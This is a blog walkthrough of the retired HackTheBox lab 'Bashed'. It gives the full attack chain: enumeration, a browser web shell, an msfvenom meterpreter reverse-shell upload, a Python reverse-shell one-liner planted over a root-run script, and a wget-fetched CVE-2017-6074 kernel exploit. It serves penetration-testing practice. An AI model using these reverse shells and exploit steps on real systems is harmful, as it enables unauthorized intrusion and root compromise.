<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge Bashed Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-bashed-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-04-30T17:44:28+00:00">April 30, 2018</time><time class="updated" datetime="2025-07-05T18:16:44+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello Friends!! Today we are going to solve a CTF Challenge “Bashed”. It is a lab that is developed by Hack the Box. They have an amazing collection of Online Labs, on which you can practice your penetration testing skills. They have labs which are designed for beginners to the expert penetration testers. Bashed is a Retired Lab.</span></p>
<h5><span style="color: #000000;">Level: Medium</span></h5>
<p><span style="color: #000000;"><strong>Task:</strong> Find the user.txt and root.txt in the vulnerable Lab.</span></p>
<p><span style="color: #000000;">Let’s Begin!</span></p>
<p><span style="color: #000000;">As these labs are only available online, therefore, they have a static IP. Bashed Lab has IP: 10.10.10.68.</span></p>
<p><span style="color: #000000;">Now, as always let’s begin our hacking with the port enumeration.</span></p>
<pre class="lang:default decode:true">nmap -A 10.10.10.68</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Y1K8jfHZTMg/WudTCbI6DYI/AAAAAAAAWl4/k2BXoUx09mIhPfmINoudKjUFqwNuzqEKgCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Knowing port 80 is open on the victim’s network we preferred to explore his IP in the browser and the following image opened as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Yed0oh7eMqw/WudTFslzIsI/AAAAAAAAWmo/XpIpjZz4YesXF6qakwXuhDmeRtxSnn-UQCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Next, we use the dirb tool of kali to enumerate the directories and found some important directories such as <strong>/dev </strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-fGffqqLXSZM/WudTFJH54iI/AAAAAAAAWmk/qqixsG2gtTYM9xrcag4cBwFRtZyYC4KGgCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">So when you will open /dev directory in the browser, you will get a link for <strong>phpbash.php</strong>. Click on that link.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-SQEf-Kv3XYk/WudTFxKLTEI/AAAAAAAAWmw/jyefmAyTcoICd5xbSdM9FgQLHRyLGx-egCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">It will redirect to the following page as shown below, which seems like a shell interacting through the browser.</span></p>
<p><span style="color: #000000;">After that, you can execute any os arbitrary command for testing whether it’s working or not. We have run <strong>ls command</strong> to check the present list in the current directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-xvQXy9_j96k/WudTF52G7FI/AAAAAAAAWms/A-LdM1775I8np7_EuSf3h5f1AJrFXosxACLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Inside <strong>/html directory </strong>we found <strong>uploads folder</strong> and hence now we can easily compromise the target’s system by uploading backdoor.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-F9qLB8RhGbE/WudTGAI7lbI/AAAAAAAAWm0/e74uoJCySZUECcuLv8qQDpVC1ZgkZf37ACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Using msfvenom we had created a malicious <strong>shell.php</strong> file by executing following command.</span></p>
<pre class="lang:default decode:true">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.28 lport=4444 -f raw</pre>
<p><span style="color: #000000;">Simultaneously run multi/handler for reverse connection of the victim’s system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-h2paU69-4HU/WudTGp2tR8I/AAAAAAAAWm8/zH7gSKPhRQ0RCsH_d3u_dQJcEkwVy1LHACLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">We had used Python HTTP server for transferring file, you can also use an alternative method for transferring and download the malicious file from wget inside uploads directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Oxrjvh3O9ok/WudTGbBi0uI/AAAAAAAAWm4/onpZrzep4_Av73dmml40BLlRjfw5ubn-wCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Now execute the malicious file shell.php from the browser as shown below and move to Metasploit framework for reverse connection.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-EYvwcE36G0A/WudTCp1SguI/AAAAAAAAWl8/xZmiDoZZy6EE3jR9wcxrGF3yA8xuR0aagCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">After executing uploaded backdoor file come back to the Metasploit framework and wait for the meterpreter session.</span></p>
<pre class="lang:default decode:true">msf use exploit/multi/handler
msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) set lhost 10.10.14.28
msf exploit(multi/handler) set lport 4444
msf exploit(multi/handler) exploit</pre>
<p><span style="color: #000000;">From given below image you can observe <strong>meterpreter session1</strong> opened for accessing victim tty shell.</span></p>
<p><span style="color: #000000;">Now let’s finish the task by grabbing user.txt and root.txt file. First I move into /home directory and check available files and directories inside it.</span></p>
<pre class="lang:default decode:true">cd /home
ls</pre>
<p><span style="color: #000000;">Here one directories arrexel, when I explore <strong>/home/arrexel</strong> I saw user.txt and use cat command for reading.</span></p>
<pre class="lang:default decode:true">cd arrexel
ls
cat user.txt</pre>
<h5><span style="color: #000000;">Great!!  Here we had completed 1<sup>st</sup> task now move to 2<sup>nd</sup> task</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-alG01DLs4dA/WudTCmqDqVI/AAAAAAAAWmA/iWP2QNxzsLU4MIJbUvuv-SmMLepLdVTGQCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">For spawning proper tty shell of target’s system we need to import python file, therefore, I run following command inside the meterpreter shell</span></p>
<pre class="lang:default decode:true">shell
python -c 'import pty;pty.spawn("/bin/bash")'
lsb_release -a</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-QpT-yMHiKQc/WudTDfwMVqI/AAAAAAAAWmM/zSmIkqCpiyAAu8LYwThExhubuLSSjDmIgCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Run <strong>ls -al command</strong> to observe all directories with their permissions. Here you will notice the user scriptmanager has permission for accessing /scripts directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EHfX4SFl1Ek/WudTDNY44hI/AAAAAAAAWmE/WgxZBRX6KSYNNoB99PX8PntCLCfUqZXRQCLcBGAs/s1600/13.0.png"/></span></p>
<p><span style="color: #000000;">When we tried to open /scripts directory as the default user, it showed Permission Denied message. Then <strong>run sudo -l </strong>command which will tell us that the scriptmanager has No password for all the things.</span></p>
<p><span style="color: #000000;">Then we run the following command for penetrating scripts folder with help of scriptmanager</span></p>
<pre class="lang:default decode:true">sudo -u scriptmanager ls /scripts
sudo -u scriptmanager cat /scripts/test.py
sudo -u scriptmanager cat /scripts/test.txt</pre>
<p><span style="color: #000000;">Since we found a python file, therefore, our strategy will be to replace the original test.py file from malicious python file to have a reverse connection over netcat and for that, you need to save following code in a text file. </span></p>
<pre class="lang:default decode:true ">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.28",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);</pre>
<p><span style="color: #000000;">Save this file with <strong>.py</strong> <strong>extension </strong>and transfer it into the victim’s system and start netcat on listening port.</span></p>
<p><span style="color: #000000;"><strong> </strong><strong>Note:</strong> Replace 10.10.14.28 from inside the code into your VPN IP.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-XX-t_7pPb-E/WudTDEJaDnI/AAAAAAAAWmI/efAK1DG_IrgQVwYtklz0Tb4d1KpI0xv2wCLcBGAs/s1600/13.1.png"/></span></p>
<p><span style="color: #000000;">Now download malicious python file inside /tmp</span></p>
<pre class="lang:default decode:true">wget http://10.10.14.28/root.py</pre>
<p><span style="color: #000000;">And then copy the root.py from inside /tmp into test.py in /script with the help of the following command.</span></p>
<pre class="lang:default decode:true">sudo -u scriptmanager cp /tmp/root.py /scripts/test.py</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-SkAb9C-fVaU/WudTD7cbi4I/AAAAAAAAWmQ/fBScC_h-UeYaM_oIUmeZbC8i4fUKOBgdACLcBGAs/s1600/13.2.png"/></span></p>
<p><span style="color: #000000;">After some time you will get reverse to connect at netcat terminal with root access. Now finish the task by capturing the root.txt file as shown below.</span></p>
<pre class="lang:default decode:true">nc -lvp 1234
id
cd /root<span style="vertical-align: inherit;"><span style="vertical-align: inherit;">
ls</span></span>
cat root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-5sg9CjPxRK0/WudTD9nNMhI/AAAAAAAAWmU/zgWTOo4ogH49fVDSigHa4S3joX-ye7LmACLcBGAs/s1600/13.3.png"/></span></p>
<h4><span style="color: #000000;">2<sup>nd</sup> Method for finding the root.txt flag.</span></h4>
<p><span style="color: #000000;">We have found machine architecture 14.0 in the above method. So we start looking for a related kernel exploit in Google and luckily found an exploit from <a style="color: #000000;" href="https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-6074/poc.c"><span style="color: #3366ff;">here</span></a> for root privilege escalation. </span></p>
<p><span style="color: #000000;">Copy and paste the whole text inside a text file and save as <strong>poc.c</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2ZSdLzyWS0E/WudTESbfkpI/AAAAAAAAWmY/aJvAW2-K5lY_hTRBsQfufWnG1YuwhtIRACLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">After that compile it with help of the following command:</span></p>
<pre class="lang:default decode:true">gcc poc.c -o pwn</pre>
<p><span style="color: #000000;">Run python HTTP server for transferring it into targets system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9r3e1-kDiJc/WudTEtg3QDI/AAAAAAAAWmc/xoV8s6Iw40oTkPuUbEEI7bNScKZZO0wNACLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">At last, download complied file pwn into the target machine from wget inside <strong>/dev/shm</strong> as shown in the image then give full permission and run the file.</span></p>
<pre class="lang:default decode:true ">wget http://10.10.14.28/pwn
chmod 777 pwn
./pwn</pre>
<p><span style="color: #000000;">It will give you root access, now catch the root.txt flag as soon as possible because it will crash the kernel after some time.</span></p>
<pre class="lang:default decode:true">cd /root
cat root.txt</pre>
<p><span style="color: #000000;"><strong>Superb!!</strong><strong> </strong>We had completed the task and hacked this box.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RNTgMOva2RQ/WudTE6e1ieI/AAAAAAAAWmg/P2a1rZIZBX4Ws-ZlYniujQygY4Lfuw5VgCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
